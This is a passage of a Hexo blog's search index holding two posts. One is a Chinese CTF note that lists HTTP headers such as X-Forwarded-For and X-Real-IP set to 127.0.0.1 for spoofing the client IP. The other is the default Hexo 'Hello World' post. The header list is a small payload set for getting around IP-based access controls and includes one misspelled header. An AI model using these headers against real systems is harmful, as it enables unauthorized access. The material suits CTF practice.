        <content type="html"><![CDATA[<p>在一些CTF比赛常常会考到通过<strong>伪造IP</strong>获得flag，下面是一些常见的IP伪造的请求头：</p><ul><li><strong>X-Forwarded-For:127.0.0.1</strong></li><li><strong>Client-ip:127.0.0.1</strong></li><li><strong>X-Client-IP:127.0.0.1</strong></li><li><strong>X-Remote-IP:127.0.0.1</strong></li><li><strong>X-Rriginating-IP:127.0.0.1</strong></li><li><strong>X-Remote-addr:127.0.0.1</strong></li><li><strong>HTTP_CLIENT_IP:127.0.0.1</strong></li><li><strong>X-Real-IP:127.0.0.1</strong></li><li><strong>X-Originating-IP:127.0.0.1</strong></li><li><strong>via:127.0.0.1</strong></li><li><strong>X-Forwarded:127.0.0.1</strong></li><li><strong>X-Forwarded-Host:127.0.0.1</strong></li><li><strong>True-Client-IP:127.0.0.1</strong></li><li><strong>Ali-CDN-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Src-IP:127.0.0.1</strong></li><li><strong>CF-Connecting-IP:127.0.0.1</strong></li><li><strong>Proxy-Client-IP:127.0.0.1</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/01/31/hello-world/"/>
      <url>/2025/01/31/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
